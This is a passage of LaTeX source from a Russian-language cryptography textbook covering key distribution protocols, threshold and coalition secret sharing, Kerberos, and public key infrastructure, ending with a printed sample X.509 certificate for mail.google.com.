Полученная последовательность квадратичных вычетов $x_1, x_2, x_3, \dots$ -- периодическая с периодом $T < |\set{QR}_n|$. Чтобы ее период для случайного $x_0$ с большой вероятностью оказался большим, числа $p,q$ выбирают с условием малого $\gcd(\varphi(p-1), \varphi(q-1))$, где $\varphi(n)$ -- функция Эйлера.

Полученная последовательность ключей является криптографически стойкой. Доказано, что для <<взлома>> (т.е. определения следующего символа с вероятностью, отличной от $\frac{1}{2}$), требуется разложить число $n=pq$ на множители. Разложение числа на множители считается трудной задачей, все известные алгоритмы не являются полиномиальными по $\log_2 n$.

Оказывается, что если вместо одного последнего бита $k_i = x_i \mod 2$ брать $O(\log_2 \log_2 n)$ последних бит рассмотренного выше генератора $x_i$, то полученная последовательность останется криптостойкой.

Большой недостаток генератора BBS -- малая скорость генерирования бит.


%\input{micalis_generator}

\input{maximal_period_sequences}

\section[Три способа улучшения последовательностей]{Три способа улучшения \protect\\ последовательностей}

\input{generators_with_multiple_shift_registers}

\input{generators_with_nonlinear_transformations}

\input{majority_generators}

\input{hash-functions}

\input{public-key}

\chapter{Распространение ключей}

Задачей распространения ключей между двумя пользователями является создание секретных псевдослучайных сеансовых ключей шифрования и аутентификация сообщений. Пользователи предварительно создают и обмениваются ключами аутентификации один раз. В дальнейшем для создания защищенной связи пользователи производят взаимную аутентификацию и вырабатывают сеансовые ключи\index{ключ!сеансовый}.

\input{shamirs_three-step_protocol}

\section{Протоколы с симметричными шифрами}

\subsection{Аутентификация и атаки воспроизведения}

Рассмотрим такую ситуацию: обе стороны $A$ и $B$ имеют общий долговременный ключ $K_{AB}$ и симметричную систему шифрования. Нужно выработать сеансовый секретный ключ $K$. Сторона $A$ создает ключ $K$ и желает его передать стороне $B$.

\begin{enumerate}
    \item Для этого сторона $A$ с помощью общего ключа $K_{AB}$ создает и передает $B$ шифрованное сообщение:
            \[ A \rightarrow B: ~ E_{K_{AB}}(K, B, A). \]
        В этом сообщении имеются так называемые поля -- $(B,A)$ -- информация для дополнительного подтверждения.
    \item Сторона $B$, используя общий ключ $K_{AB}$, расшифровывает полученное сообщение:
            \[ D_{K_{AB}}( E_{K_{AB}}( K, B, A)) = (K, B, A). \]
        В результате сторона $B$ получает сеансовый ключ $K$ и дополнительные данные $(B,A)$.
\end{enumerate}

Недостаток этого протокола состоит в том, что криптоаналитик может перехватывать сообщения и через некоторое время переслать их стороне $A$.

Рассмотрим другие варианты решения задачи о передаче сеансового ключа.
Задача остается прежней: обе стороны $A$ и $B$ имеют общий долговременный секретный ключ $K_{AB}$, сторона $A$ должна выработать сеансовый секретный ключ $K$ и доставить стороне $B$.

Протокол включает \textbf{метки времени} -- информацию о моменте $t_A$ отправки сообщения и моменте получения сообщения $t_B$.

\begin{enumerate}
    \item Сторона $A$ вырабатывает $K$ и с помощью долговременного ключа $K_{AB}$ создает шифрованное сообщение с меткой времени $t_A$ и передает его стороне $B$:
            \[ A \rightarrow B: ~ E_{K_{AB}}(K, t_A). \]
    \item Сторона $B$ получает сообщение и расшифровывает его с помощью общего ключа:
            \[ D_{K_{AB}}( E_{K_{AB}}( K, t_A)) = (K, t_A). \]
        В результате $B$ получает $(K, t_A)$, то есть секретный ключ и метку времени. $B$ измеряет время прихода $t_B$ и интервал запаздывания. Если $|t_B - t_A| \le \delta$, то $B$ аутентифицирует $A$.
\end{enumerate}
Метка времени является одноразовой меткой и защищает от атак воспроизведения ранее записанных сообщений.

Рассмотрим другой способ передачи ключа с дополнительной информацией в виде \textbf{одноразовых случайных меток} (nonce -- number used once) вместо меток времени. Протокол передачи состоит в следующем.

\begin{enumerate}
    \item Сторона $A$ вырабатывает случайное число $r_A$, шифрует сообщение, в котором  $(r_A, A)$ -- реквизиты $A$, и передает его стороне $B$:
            \[ A \rightarrow B: ~ E_{K_{AB}}(r_A, A). \]
    \item Сторона $B$ вырабатывает сеансовый ключ $K$, создает шифрованное сообщение и посылает его $A$:
            \[ A \leftarrow B: ~ E_{K_{AB}}(K, r_A, A). \]
    \item Сторона $A$ расшифровывает полученное сообщение:
            \[ D_{K_{AB}}( E_{K_{AB}}( K, r_A, A)) = (K, r_A, A). \]
        В результате $A$ получает сеансовый ключ и подтверждение своих реквизитов, что является дополнительной аутентификацией.
\end{enumerate}

Предположим, что сторона $B$ тоже желает убедиться, что имеет дело со стороной $A$. Тогда этот протокол следует дополнить передачей реквизитов $B$. По-прежнему считаем, что у $A$ и $B$ -- общая система шифрования с долговременным секретным ключом $K_{AB}$.

\begin{enumerate}
    \item Сторона $A$ вырабатывает случайное число $r_A$, шифрует и передает стороне $B$ сообщение, в котором  $(r_A, A)$ -- реквизиты $A$:
            \[ A \rightarrow B: ~ E_{K_{AB}}(r_A, A). \]
    \item Сторона $B$ вырабатывает случайное число $r_B$ и отправляет стороне $A$ зашифрованное сообщение:
            \[ A \leftarrow B: ~ E_{K_{AB}}(K_B, r_B, r_A, A), \]
        где $K_B$ -- ключ $B$.
     \item Сторона $A$ осуществляет расшифрование
            \[ D_{K_{AB}}(E_{K_{AB}}(K_B, r_B, r_A, A)) = (K_B, r_B, r_A, A) \]
        и получает ключ $K_B$ и реквизиты $r_B, r_A, A$. Для аутентификации себя сторона $A$ создает свой ключ $K_A$ и отправляет стороне $B$ шифрованное сообщение
            \[ A \rightarrow B: ~ E_{K_{AB}}(K_A, r_B, r_A, B). \]
     \item Сторона $B$ осуществляет расшифрование
            \[ D_{K_{AB}}(E_{K_{AB}}(K_A, r_B, r_A, B)) = (K_A, r_B, r_A, B), \]
        которое определяет ключ $K_A$ и аутентифицирует $A$.
\end{enumerate}

Таким образом, обе стороны имеют в своем распоряжении ключи $K_A, K_B$ в качестве сеансовых секретных ключей.


\subsection{Протокол с ключевым кодом аутентификации}

При использовании хэш-функции $K = h(K_{A} \| K_{B})$ происходит усиление секретности. Здесь $(K_{A} \| K_{B})$ -- конкатенация $K_{A} $ и $K_{B}$.

% Достоинства: предположим, $K_{A} ,K_{B} $ - не обладают «хорошими» свойствами случайности (биты распределены неравномерно или зависимы друг от друга), т.е., $P_{K_{A} ,K_{B} } (0)=\frac{1}{2} -\varepsilon $, где $\varepsilon $ - мало, но не 0. Тогда вероятность того, что этот бит в \textit{K }будет равным нулю, $P_{K} (0)=\frac{1}{2} -\varepsilon ',\varepsilon '<\varepsilon $- усиление секретности.

Вычисление хэш-значения, как правило, выполняется быстрее, чем расшифрование. Поэтому были разработаны протоколы, в которых вместо функции шифрования используется имитовставка\index{имитовставка} на основе хэш-функции ($\MAC_K$). Рассмотрим протокол такого рода.
\begin{enumerate}
    \item Сторона $A$ вырабатывает сеансовый ключ $K$, использует одноразовую метку $t_{A}$, создает и пересылает стороне $B$ сообщение:
            \[ A \rightarrow B: ~ t_A, ~ B, ~ K \oplus \MAC_{K_{AB}}( t_A, B), ~ \MAC_{K_{AB}}(K, t_A, B). \]
    \item Сторона $B$ вычисляет
            \[ \MAC_{K_{AB}}(t_A, B) \oplus K \oplus \MAC_{K_{AB}}(t_A, B) = K \]
        и получает сеансовый ключ $K$.
\end{enumerate}

Заметим, что криптоаналитик может добавить в поле случайную последовательность, тогда вместо $K$ получаем <<$K$ плюс помеха>>. Вмешательство криптоаналитика будет выявлено благодаря наличию четвертого поля в сообщении. Используя полученное значение $K$, вычисляют $\MAC_{K_{AB}}(K, t_A, B)$ и сравнивают с четвертым полем. Если совпадает, то вмешательства криптоаналитика не было.

\input{needham-schroeder_protocol}

\section{Протоколы на криптосистемах с открытым ключом}

\subsection{Простой протокол}

Рассмотрим протокол распространения ключей с помощью асимметричных шифров. Введем обозначения: $K_B$ -- открытый ключ стороны $B$, а $K_A$ -- открытый ключ стороны $A$. Протокол включает три сеанса обмена информацией.
\begin{enumerate}
    \item В первом сеансе сторона $A$ посылает стороне $B$ сообщение
            \[ A \rightarrow B: ~ E_{K_B}(K_1, A), \]
        где $K_1$ -- ключ, выработанный стороной $A$.
    \item Сторона $B$ получает $(K_1, A)$ и передает стороне $A$ наряду с другой информацией свой ключ $K_2$ в сообщении, зашифрованном с помощью открытого ключа $K_A$:
            \[ A \leftarrow B: ~ E_{K_A}(K_2, K_1, B). \]
    \item Сторона $A$ получает и расшифровывает сообщение $(K_2, K_1, B)$. Во время третьего сеанса сторона $A$, чтобы подтвердить, что она знает ключ $K_2$, посылает стороне $B$ сообщение
            \[ A \rightarrow B: ~ E_{K_B}(K_2). \]
\end{enumerate}
Общий ключ формируется из двух ключей $K_1, K_2$.

\subsection{Протоколы с цифровыми подписями}

Существуют протоколы обмена, в которых перед началом обмена ключами генерируются подписи сторон $A$ и $B$, соответственно $S_A(m)$ и $S_B(m)$. В этих протоколах можно использовать различные одноразовые метки. Рассмотрим пример.
\begin{enumerate}
    \item Сторона $A$ выбирает ключ $K$ и вырабатывает сообщение
            \[ \left( K, ~ t_A, ~ S_A(K, t_A, B) \right), \]
        где $t_A$ -- метка времени. Зашифрованное сообщение передает стороне $B$:
        \[ A \rightarrow B: ~ E_{K_B}(K, ~ t_A, ~ S_A(K, t_A, B)). \]
    \item Сторона $B$ получает это сообщение, расшифровывает $\left( K, ~ t_A, ~ S_A(K, t_A, B) \right)$ и вырабатывает свою метку времени $t_B$. Проверка считается успешной, если $|t_B - t_A | < \delta $. Сторона $B$ знает свои реквизиты и может осуществлять проверку подписи.
\end{enumerate}

Имеется второй вариант протокола, в котором шифрование и подпись выполняются раздельно.
\begin{enumerate}
    \item Сторона $A$ вырабатывает ключ $K$, использует одноразовую метку (или метку времени) $t_{A}$ и передает стороне $B$ два различных зашифрованных сообщения
            \[ \begin{array}{ll}
                A \rightarrow B: & ~ E_{K_B}(K, t_A), \\
                A \rightarrow B: & ~ S_A(K, t_A, B). \\
            \end{array} \]
    \item Сторона $B$ получает это сообщение, расшифровывает $K, t_A$ и, добавив свои реквизиты $B$, может проверить подпись $S_A(K, t_A, B)$.
\end{enumerate}

В третьем варианте протокола сначала производится шифрование, потом подпись.
\begin{enumerate}
    \item Сторона $A$ вырабатывает ключ $K$, использует одноразовую случайную метку или метку времени $t_A$ и передает стороне $B$ сообщение
        \[ A \rightarrow B: ~ t_A, ~ E_{K_B}(K, A), ~ S_A(t_A, ~ K, ~ E_{K_B}(K, A)). \]
    \item Сторона $B$ получает это сообщение, расшифровывает $\left( t_A, ~ K, ~ A, ~ E_{K_B}(K, A) \right)$ и проверяет подпись $S_A(t_A, ~ K, ~ E_{K_B}(K, A))$.
\end{enumerate}

\input{diffie-hellman}

%\section{Протоколы с аутентификацией}

\subsection{Односторонняя аутентификация}

\input{el-gamal_protocol}

\input{mti}

\subsection{Взаимная аутентификация схемой ЭП}
\selectlanguage{russian}

\textbf{Протокол STS (Station-To-Station)}\index{протокол!Station-To-Station} предназначен для систем мобильной связи. Он использует идеи протокола Диффи~---~Хеллмана\index{протокол!Диффи~---~Хеллмана} и идеи системы RSA\index{криптосистема!RSA}.

Здесь открытые общедоступные данные
    \[ p, ~ g, ~ \PK_A, ~ \PK_B. \]
Каждая из сторон $A$ и $B$ обладает долговременной парой ключей: секретным ключом подписания $\SK$ и открытым ключом проверки подписи $\PK$ для \emph{схемы ЭП}.
\[ \begin{array}{ll}
    A: & ~ \SK_A, ~~ \PK_A, \\
    B: & ~ \SK_B, ~~ \PK_B. \\
\end{array} \]
Подписи к сообщению $m$ сторон $A$ и $B$ имеют вид:
\[ \begin{array}{ll}
    A: & ~ S_A(m) = \textrm{ЭП}_{\SK_A}(H(m)), \\
    B: & ~ S_B(m) = \textrm{ЭП}_{\SK_B}(H(m)), \\
\end{array} \]
$H(m)$ -- криптографическая хэш-функция от сообщения $m$.

Протокол состоит из трех раундов обмена информацией между сторонами $A$ и $B$.
\begin{enumerate}
    \item Сторона $A$ создает секретное случайное число $2 \leq x \leq p-1$ и отправляет $B$:
            \[ A \rightarrow B: ~ g^x \mod p. \]
    \item Сторона $B$ создает секретное случайное число $2 \leq y \leq p-1$, вычисляет общий секретный ключ
            \[ K = (g^x)^y = g^{xy} \mod p, \]
        с помощью которого создает шифрованное сообщение $E_K(S_B(g^x, g^y))$ для аутентификации и отправляет $A$:
            \[ A \leftarrow B: ~ \left( g^y \mod p, ~~ E_K( S_B( g^x, g^y)) \right). \]
    \item Сторона $A$ с помощью $x, g^y \mod p$ вычисляет общий секретный ключ
            \[ K = (g^y)^x \mod p = g^{xy} \mod p \]
        и расшифровывает сообщение
            \[ D_K( E_K( S_B( g^x, g^y))) = S_B( g^x, g^y). \]
            Затем аутентифицирует сторону $B$, проверяя подпись $S_B$ открытым ключом $\PK_B$. Вычисляет и пересылает стороне $B$ сообщение:
            \[ A \rightarrow B: ~ E_K( S_A( g^x, g^y)). \]
    \item Сторона $B$ расшифровывает принятое сообщение
            \[ D_K( E_K( S_A( g^x, g^y))) = S_A( g^x, g^y) \]
        и осуществляет аутентификацию, выполняя проверку подписи $S_A$ с помощью открытого ключа $\PK_A$.
\end{enumerate}


\input{girrault}

В этом разделе были рассмотрены протоколы, в которых ключи вырабатываются в процессе обмена информацией.
%Существует и другой подход, который будет рассмотрен в следующих разделах.

\chapter{Разделение секрета}

\section{Пороговые схемы}

Идея \textbf{пороговой} $(n, N)$-схемы\index{разделение секрета!пороговое} разделения общего секрета среди $N$ пользователей состоит в следующем.
%описывается так:
Доверенная сторона хочет распределить некий секрет $K_0$ между $N$ пользователями таким образом, что:
%. Поставлены следующие условия:
\begin{itemize}
    \item любые $m, ~ n \le m \le N$ легальных пользователей могут получить секрет (или доступ к секрету), если предъявят свои секретные ключи;
    \item любые $m, ~ m < n$, легальных пользователей не могут получить секрет и не могут определить (вычислить) этот секрет, пытаясь решить трудную в вычислительном смысле задачу.
\end{itemize}

Далее рассмотрены два случая: $(n, N)$-схема Шамира и простая $(N,N)$-схема.

\input{shamirs_secret_sharing}

\input{xor_secret_sharing}

\section[Распределение секрета по коалициям]{Распределение секрета по \protect\\ коалициям}

\subsection[Схема для нескольких коалиций]{Распределение секрета по нескольким \protect\\ коалициям}

Предположим, что имеется $N$ легальных пользователей
    \[ \{ U_1, U_2, \dots, U_N \}, \]
которым нужно сообщить (открыть, получить доступ к) общий секрет $K$.

Секрет может быть доступен только определенным коалициям\index{распределение секрета!по коалициям}, например
\[ \begin{array}{l}
    C_1 = \{ U_1, U_2 \}, \\
    C_2 = \{ U_1, U_3, U_4 \}, \\
    C_3 = \{ U_2, U_3 \}, \\
    \dots
\end{array} \]
При этом ни одна из коалиций $C_i, ~ i = 1, 2, \dots$ не должна быть подмножеством другой коалиции.


\subsubsection{Пример 1}

Имеется 4 участника
    \[ \{ U_1, U_2, U_3, U_4 \}, \]
которые образуют 3 коалиции
\[ \begin{array}{l}
    C_1 = \{ U_1, U_2 \}, \\
    C_2 = \{ U_1, U_3 \}, \\
    C_3 = \{ U_2, U_3, U_4 \}. \\
\end{array} \]
Распределение частичных секретов между ними представлено в виде табл. \ref{tab:secret-share-coalition-1}, в которой введены следующие обозначения: $a_1, b_1, c_2, c_3$ -- случайные числа из кольца $\Z_M$. В строках таблицы содержатся частичные секреты каждого из пользователей, в столбцах таблицы показаны частичные секреты, соответствующие каждой из коалиций.

\begin{table}[!ht]
    \centering
    \caption{Распределение секрета по определенным коалициям\label{tab:secret-share-coalition-1}}
    \begin{tabular}{|c||c|c|c|}
        \hline
              & $C_1 = \{ U_1, U_2 \}$ & $C_2 = \{U_1, U_3 \}$ & $C_3 = \{ U_2, U_3, U_4 \}$ \\
        \hline \hline
        $U_1$ & $a_1$     & $b_1$     & -- \\
        $U_2$ & $K - a_1$ & --        & $c_2$ \\
        $U_3$ & --        & $K - b_1$ & $c_3$  \\
        $U_4$ & --        & --        & $K - c_2 - c_3$ \\
        \hline
    \end{tabular}
\end{table}

Как видно из приведенных данных, суммирование по модулю $M$ чисел, приведенных в каждом из столбцов таблицы, открывает секрет $K$.


\subsubsection{Пример 2}

%\section{Схема разделения секрета на монотонных булевых функциях}
%\example
В системе распределения секрета доверенный
%с использованием монотонных булевых функций
центр использует кольцо $\Z_m$ целых чисел по модулю $m$. Требуется разделить секрет $K$ между $5$ пользователями
    \[ \{ U_1, U_2, U_3, U_4, U_5 \} \]
так, чтобы восстановить секрет могли только коалиции
\[ \begin{array}{lll}
    C_1 = \{ U_1, U_2 \},      & & C_2 = \{ U_1, U_3 \}, \\
    C_3 = \{ U_2, U_3, U_4 \}, & & C_4 = \{ U_2, U_3, U_5 \}, \\
    C_5 = \{ U_3, U_4, U_5 \}, & & C_6 = \{ U_1, U_2, U_3 \}. \\
\end{array} \]

Заданное множество коалиций с доступом не является минимальным, так как одни коалиции входят в другие:
    \[ C_1 \subset C_6, ~ C_2 \subset C_6. \]
Исключая $C_6$, получим минимальное множество коалиций с доступом к секрету -- ни одна из оставшихся коалиций не входит в другую $C_i \nsubseteq C_j$ для $i \neq j$. Пользователям выдаются тени по минимальному множеству коалиций с доступом. В строках таблицы \ref{tab:secret-share-coalition-2} содержатся частичные секреты каждого из пользователей, в столбцах таблицы показаны частичные секреты, соответствующие каждой из коалиций.

\begin{table}[!ht]
    \centering
    \caption{Распределение секрета по определенным коалициям\label{tab:secret-share-coalition-2}}
    \begin{tabular}{|c||c|c|c|c|c|}
        \hline
              & $C_1$     & $C_2$     & $C_3$           & $C_4$           & $C_5$  \\
        \hline \hline
        $U_1$ & $a_1$     & $b_1$     & --              & --              & -- \\
        $U_2$ & $K - a_1$ & --        & $c_2$           & $d_2$           & --\\
        $U_3$ & --        & $K - b_1$ & $c_3$           & $d_3$           & $e_3$ \\
        $U_4$ & --        & --        & $K - c_2 - c_3$ & --              & $e_4$ \\
        $U_5$ & --        & --        & --              & $K - d_2 - d_3$ & $K - e_3 - e_4$ \\
        \hline
    \end{tabular}
\end{table}

Тени выбираются случайно из кольца $\mathbb{\Z}_m$. В результате у пользователей будут тени:
%\exampleend

\input{brickells_scheme}

\input{bloms_scheme}

\chapter{Примеры систем защиты}

\section{Система Kerberos для локальной сети}
\selectlanguage{russian}

Система аутентификации и распределения ключей Kerberos основана на протоколе Нидхема~---~Шрёдера. Самые известные реализации протокола Kerberos включают Microsoft Active Directory и ПО Kerberos с открытым кодом для Unix.

Протокол предназначен для решения задачи аутентификации и распределения ключей в рамках локальной сети, в которой есть группа пользователей, имеющих доступ к набору сервисов, и требуется обеспечить единую аутентификацию для всех сервисов. Протокол Kerberos использует только симметричное шифрование. Секретный ключ используется для взаимной аутентификации.

Естественно, что в нелокальной сети Интернет невозможно секретно создать и распределить пары секретных ключей, и поэтому Kerberos построен для (виртуальной) локальной сети.

В протоколе используется 4 типа субъектов:

\begin{itemize}
    \item пользователи системы $C_i$,
    \item сервисы $S_i$, доступ к которым имеют пользователи,
    \item сервер аутентификации AS (Authentication Server), который производит аутентификацию пользователей по паролям и/или смарт-картам только один раз и выдает секретные сеансовые ключи для дальнейшей аутентификации,
    \item сервер выдачи мандатов TGS (ticket granting server) для аутентификации доступа к запрашиваемым сервисам, аутентификация выполняется по сеансовым ключам\index{ключ!сеансовый}, выданным сервером AS.
\end{itemize}

Для работы протокола требуется заранее распределить следующие секретные симметричные ключи для взаимной аутентификации.
\begin{itemize}
    \item Ключи $K_{C_i}$ между пользователем $i$ и сервером AS. Как правило, ключом служит обычный пароль\index{пароль}, точнее результат хэширования пароля. Может быть использована и смарт-карта.
    \item Ключ $K_{TGS}$ между серверами AS и TGS.
    \item Ключи $K_{S_i}$ между сервисами $S_i$ и сервером TGS.
\end{itemize}

\begin{figure}[!ht]
	\centering
	\includegraphics[width=\textwidth]{pic/kerberos}
	\caption{Схема аутентификации и распределения ключей Kerberos\label{fig:kerberos}}
\end{figure}

На рис. \ref{fig:kerberos} представлена схема протокола, состоящая из 6 шагов.

Введем обозначения для протокола между пользователем $C$ с ключом $K_C$ и сервисом $S$ с ключом $K_S$.
\begin{itemize}
    \item $ID_C, ID_{TGS}, ID_S$ -- идентификаторы пользователя, сервера TGS и сервиса $S$ соответственно,
    \item $t_i, \tilde{t}_i$ -- запрашиваемые и выданные границы времени действия сеансовых ключей аутентификации,
    \item $ts_i$ -- метка текущего времени (timestamp),
    \item $N_i$ -- одноразовая метка (nonce)\index{одноразовая метка}, псевдослучайное число для защиты от атак воспроизведения сообщений,
    \item $K_{C,TGS}, K_{C,S}$ -- выданные сеансовые ключи аутентификации пользователя и сервера TGS, пользователя и сервиса $S$, соответственно,
    \item $T_{TGS} = E_{K_{TGS}}(K_{C,TGS} ~\|~ ID_C ~\|~ \tilde{t}_1)$ -- мандат (ticket) для TGS, который пользователь расшифровать не может,
    \item $T_{S} = E_{K_S}(K_{C,S} ~\|~ ID_C ~\|~ \tilde{t}_2)$ -- мандат для сервиса $S$, который пользователь расшифровать не может,
    \item $K_1, K_2$ -- обмен информацией для генерирования общего секретного симметричного ключа дальнейшей коммуникации, например, по протоколу Диффи~---~Хеллмана\index{протокол!Диффи~---~Хеллмана}.
\end{itemize}

Схема протокола следующая.
\begin{enumerate}
    \item Первичная аутентификация пользователя по паролю, получение сеансового ключа $K_{C,TGS}$ для дальнейшей аутентификации. Это действие выполняется один раз для каждого пользователя, чтобы уменьшить риск компроментации пароля.
        \begin{enumerate}
            \item $C \rightarrow AS: ~~ ID_C ~\|~ ID_{TGS} ~\|~ t_1 ~\|~ N_1$.
            \item $C \leftarrow AS: ~~ ID_C ~\|~ T_{TGS} ~\|~ E_{K_C}( K_{C,TGS} ~\|~ \tilde{t}_1 ~\|~ N_1 ~\|~ ID_{TGS})$.
        \end{enumerate}
    \item Аутентификация сеансовым ключом $K_{C,TGS}$ на сервере TGS для запроса доступа к сервису выполняется один раз для каждого сервиса. Получение другого сеансового ключа аутентификации $K_{C,S}$.
        \begin{enumerate}
            \item $C \rightarrow TGS: ~~ ID_S ~\|~ t_2 ~\|~ N_2 ~\|~ T_{TGS} ~\|~ E_{K_{C,TGS}}(ID_C ~\|~ ts_1)$.
            \item $C \leftarrow TGS: ~~ ID_C ~\|~ T_{S} ~\|~ E_{K_{C,TGS}}( K_{C,S} ~\|~ \tilde{t}_2 ~\|~ N_2 ~\|~ ID_S)$.
        \end{enumerate}
    \item Аутентификация сеансовым ключом $K_{C,S}$ на сервисе $S$ -- создание общего сеансового ключа дальнейшего взаимодействия.
        \begin{enumerate}
            \item $C \rightarrow S: ~~ T_{S} ~\|~ E_{K_{C,S}}(ID_C ~\|~ ts_2 ~\|~ K_1)$.
            \item $C \leftarrow S: ~~ E_{K_{C,S}}( ts_2 ~\|~ K_2)$.
        \end{enumerate}
\end{enumerate}

Аутентификация и проверка целостности достигается сравнением идентификаторов, одноразовых меток и меток времени внутри зашифрованных сообщений после расшифрования с их действительными значениями.

Некоторым недостатком схемы является необходимость синхронизации часов между субъектами сети.


\section{Инфраструктура открытых ключей}\label{chapter-public-key-infrastructure}

\subsection{Иерархия удостоверяющих центров}\label{section-CAs}
\selectlanguage{russian}

Проблему аутентификации и распределения сеансовых симметричных ключей шифрования в Интернете, а также в больших локальных и виртуальных сетях, решают с помощью построения иерархии открытых ключей криптосистем с открытым ключом.

\begin{enumerate}
    \item Существует удостоверяющий центр (УЦ) верхнего уровня\index{Удостоверяющий центр!верхнего уровня}, корневой УЦ\index{Удостоверяющий центр!корневой} (Root Certification Authority, $CA$)\index{Certification Authority!Root}, обладающий парой из секретного и открытого ключей. Открытый ключ УЦ верхнего уровня распространяется среди всех пользователей, причем все пользователи \emph{доверяют УЦ}. Это означает, что:
        \begin{itemize}
            \item УЦ -- <<хороший>>, обеспечивает надежное хранение секретного ключа, не пытается фальсифицировать и скомпрометировать свои ключи,
            \item имеющийся у пользователей открытый ключ УЦ действительно принадлежит УЦ.
        \end{itemize}
        В массовых информационных и интернет-системах открытые ключи многих корневых УЦ встроены в дистрибутивы и пакеты обновлений ПО. Доверие пользователей неявно проявляется в их уверенности в том, что открытые ключи корневых УЦ, включенные в ПО, нефальсифицированы и нескомпрометированы. \emph{Де-факто пользователи доверяют а) распространителям ПО и обновлений, б) корневому УЦ.}\index{доверие}

        Назначение УЦ верхнего уровня -- проверка принадлежности и подписание открытых ключей других удостоверяющих центров второго уровня, а также организаций и сервисов. УЦ подписывает своим секретным ключом следующее сообщение:
        \begin{itemize}
            \item название и URI УЦ нижележащего уровня или организации/сервиса,
            \item значение сгенерированного открытого ключа и название алгоритма соответствующей криптосистемы с открытым ключом,
            \item время выдачи и срок действия открытого ключа.
        \end{itemize}

    \item УЦ второго уровня (certificate authority, CA) имеют свои пары открытых и секретных ключей, сгенерированных и подписанных корневым УЦ. Причем перед подписанием корневой УЦ убеждается в <<надежности>> УЦ второго уровня, производит юридические проверки. Корневой УЦ не имеет доступа к секретным ключам УЦ второго уровня.

        Пользователи, имея в своей базе открытых ключей доверенные открытые ключи корневого УЦ, могут проверить ЭП открытых ключей УЦ 2-го уровня и убедиться, что предъявленный открытый ключ действительно принадлежит данному УЦ. Таким образом:
        \begin{itemize}
            \item Пользователи полностью доверяют корневому УЦ и его открытому ключу, который у них хранится. Пользователи верят, что корневой УЦ не подписывает небезопасные ключи и гарантирует, что подписанные им ключи действительно принадлежат УЦ 2-го уровня.
            \item Проверив ЭП открытого ключа УЦ 2-го уровня с помощью доверенного открытого ключа УЦ 1-го уровня, пользователь верит, что открытый ключ УЦ 2-го уровня действительно принадлежит данному УЦ и не был скомпрометирован.
        \end{itemize}

        Аутентификация в протоколе защищенного интернет-соединения SSL/TLS\index{протокол!SSL/TLS} достигается в результате проверки пользователями совпадения URI-адреса сервера из ЭП с фактическим адресом.

        УЦ второго уровня в свою очередь тоже подписывает открытые ключи УЦ третьего уровня, а также организаций. И так далее по уровням.

    \item В результате построена \emph{иерархия} подписанных открытых ключей.

    \item Открытый ключ с идентификационной информацией (название организации, URI-адрес веб-ресурса, дата выдачи, срок действия и др.) и подписью УЦ вышележащего уровня, заверяющей ключ и идентифицирующие реквизиты, называется \textbf{сертификатом открытого ключа},\index{сертификат открытого ключа} на который существует международный стандарт X.509, последняя версия 3. В сертификате указывается его область применения: подписание других сертификатов, аутентификация для веба, аутентификация для электронной почты и т.д.
\end{enumerate}


\begin{figure}[!ht]
	\centering
	\includegraphics[width=0.8\textwidth]{pic/X509-hierarchy}
	\caption{Иерархия сертификатов\label{fig:x509-hierarchy}}
\end{figure}

На рис. \ref{fig:x509-hierarchy} приведены пример иерархии сертификатов и путь подписания сертификата X.509 интернет-сервиса Google Mail.

Система распределения, хранения и управления сертификатами открытых ключей называется \textbf{инфраструктурой открытых ключей}\index{инфраструктура открытых ключей} (public key infrastructure, PKI)\index{PKI}. PKI применяется для аутентификации в системах SSL/TLS\index{протокол!SSL/TLS}, IPsec\index{протокол!IPsec}, PGP\index{PGP} и т.д. Помимо процедур выдачи и распределения открытых ключей PKI также определяет процедуру отзыва скомпрометированных или устаревших сертификатов.


\subsection{Структура сертификата X.509}
\selectlanguage{russian}

Ниже приведен пример сертификата X.509\index{X509.3} интернет-сервиса mail.google.com, используемый для защищенного SSL-соединения в 2009 г. Сертификат напечатан командой \texttt{openssl x509 -in file.crt -noout -text}:

{\small \begin{verbatim}
Certificate:
Data:
  Version: 3 (0x2)
  Serial Number:
    6e:df:0d:94:99:fd:45:33:dd:12:97:fc:42:a9:3b:e1
  Signature Algorithm: sha1WithRSAEncryption
  Issuer: C=ZA, O=Thawte Consulting (Pty) Ltd.,
    CN=Thawte SGC CA
  Validity
    Not Before: Mar 25 16:49:29 2009 GMT
    Not After : Mar 25 16:49:29 2010 GMT
  Subject: C=US, ST=California, L=Mountain View, O=Google Inc,
    CN=mail.google.com
  Subject Public Key Info:
    Public Key Algorithm: rsaEncryption
    RSA Public Key: (1024 bit)
      Modulus (1024 bit):
        00:c5:d6:f8:92:fc:ca:f5:61:4b:06:41:49:e8:0a:
        2c:95:81:a2:18:ef:41:ec:35:bd:7a:58:12:5a:e7:
        6f:9e:a5:4d:dc:89:3a:bb:eb:02:9f:6b:73:61:6b:
        f0:ff:d8:68:79:1f:ba:7a:f9:c4:ae:bf:37:06:ba:
        3e:ea:ee:d2:74:35:b4:dd:cf:b1:57:c0:5f:35:1d:
        66:aa:87:fe:e0:de:07:2d:66:d7:73:af:fb:d3:6a:
        b7:8b:ef:09:0e:0c:c8:61:a9:03:ac:90:dd:98:b5:
        1c:9c:41:56:6c:01:7f:0b:ee:c3:bf:f3:91:05:1f:
        fb:a0:f5:cc:68:50:ad:2a:59
      Exponent: 65537 (0x10001)
  X509v3 extensions:
    X509v3 Extended Key Usage: TLS Web Server
      Authentication, TLS Web Client Authentication,
      Netscape Server Gated Crypto
    X509v3 CRL Distribution Points:
    URI:http://crl.thawte.com/ThawteSGCCA.crl
    Authority Information Access:
    OCSP - URI:http://ocsp.thawte.com
    CA Issuers - URI:http://www.thawte.com/repository/
        Thawte_SGC_CA.crt
    X509v3 Basic Constraints: critical
    CA:FALSE
Signature Algorithm: sha1WithRSAEncryption
  62:f1:f3:05:0e:bc:10:5e:49:7c:7a:ed:f8:7e:24:d2:f4:a9:
  86:bb:3b:83:7b:d1:9b:91:eb:ca:d9:8b:06:59:92:f6:bd:2b:
  49:b7:d6:d3:cb:2e:42:7a:99:d6:06:c7:b1:d4:63:52:52:7f:
  ac:39:e6:a8:b6:72:6d:e5:bf:70:21:2a:52:cb:a0:76:34:a5:
  e3:32:01:1b:d1:86:8e:78:eb:5e:3c:93:cf:03:07:22:76:78:
  6f:20:74:94:fe:aa:0e:d9:d5:3b:21:10:a7:65:71:f9:02:09:
  cd:ae:88:43:85:c8:82:58:70:30:ee:15:f3:3d:76:1e:2e:45:
  a6:bc
\end{verbatim}}

